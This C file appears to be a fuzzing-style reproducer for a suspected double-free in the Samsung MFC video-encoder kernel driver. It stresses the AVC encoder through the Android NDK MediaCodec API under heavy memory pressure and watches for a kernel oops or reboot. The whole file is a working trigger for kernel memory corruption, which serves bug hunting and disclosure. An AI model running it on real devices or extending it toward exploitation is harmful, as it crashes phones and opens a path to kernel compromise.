/* dev_mfc_pressure: MFC double-free hunt via transient-failure injection.
 * E encoder threads loop: create AVC encoder 640x480, start, queue 8
 * garbage inputs with EOS, stop/delete (each cycle stresses buf_prepare
 * + error unwind). M memhog threads hold TOUCHED anonymous memory
 * (pressure -> dma_buf_get/get_daddr transient failures at plane>=1 ->
 * err_mem_put double-put in mfc_enc_vb2.c).
 * argv: [encoders=2] [hogs=2] [hog_MB_each=1500] [rounds=40].
 * Oracle: MFC oops in logcat/lastkmsg (or reboot). */
#include <errno.h>
#include <media/NdkMediaCodec.h>
#include <media/NdkMediaFormat.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static volatile int stop;
static int g_rounds = 40;

static void *enc_thr(void *arg)
{
    (void)arg;
    for (int r = 0; r < g_rounds && !stop; r++) {
        AMediaCodec *c = AMediaCodec_createEncoderByType("video/avc");
        if (!c) {
            usleep(50000);
            continue;
        }
        AMediaFormat *f = AMediaFormat_new();
        AMediaFormat_setString(f, "mime", "video/avc");
        AMediaFormat_setInt32(f, "width", 640);
        AMediaFormat_setInt32(f, "height", 480);
        AMediaFormat_setInt32(f, "frame-rate", 30);
        AMediaFormat_setInt32(f, "color-format", 21);
        AMediaFormat_setInt32(f, "bitrate", 2000000);
        AMediaFormat_setInt32(f, "i-frame-interval", 1);
        if (AMediaCodec_configure(c, f, NULL, NULL, 1) == 0 &&
            AMediaCodec_start(c) == 0) {
            for (int i = 0; i < 8; i++) {
                ssize_t idx = AMediaCodec_dequeueInputBuffer(c, 20000);
                if (idx < 0)
                    break;
                size_t sz = 0;
                uint8_t *b =
                    AMediaCodec_getInputBuffer(c, (size_t)idx, &sz);
                if (b && sz) {
                    memset(b, 0x41 + (r & 7), sz);
                    AMediaCodec_queueInputBuffer(
                        c, (size_t)idx, 0, sz, 0, i == 7 ? 4 : 0);
                }
            }
            AMediaCodec_flush(c);
            AMediaCodec_stop(c);
        }
        AMediaCodec_delete(c);
        AMediaFormat_delete(f);
    }
    return NULL;
}

static void *hog_thr(void *arg)
{
    size_t mb = (size_t)(long)arg;
    size_t n = mb * 1024 * 1024;
    char *p = malloc(n);
    if (!p)
        return NULL;
    for (size_t i = 0; i < n; i += 4096)
        p[i] = (char)i;
    while (!stop)
        usleep(200000);
    free(p);
    return NULL;
}

int main(int argc, char **argv)
{
    int ne = argc > 1 ? atoi(argv[1]) : 2;
    int nh = argc > 2 ? atoi(argv[2]) : 2;
    int mb = argc > 3 ? atoi(argv[3]) : 1500;
    if (argc > 4)
        g_rounds = atoi(argv[4]);
    pthread_t et[8], ht[8];
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(900);
    printf("dev_mfc_pressure: enc=%d hogs=%d hogMB=%d rounds=%d\n", ne, nh,
           mb, g_rounds);
    for (int i = 0; i < nh && i < 8; i++)
        pthread_create(&ht[i], NULL, hog_thr, (void *)(long)mb);
    sleep(3);
    for (int i = 0; i < ne && i < 8; i++)
        pthread_create(&et[i], NULL, enc_thr, NULL);
    for (int i = 0; i < ne && i < 8; i++)
        pthread_join(et[i], NULL);
    stop = 1;
    for (int i = 0; i < nh && i < 8; i++)
        pthread_join(ht[i], NULL);
    printf("dev_mfc_pressure: done, check logcat/lastkmsg for MFC oops\n");
    return 0;
}
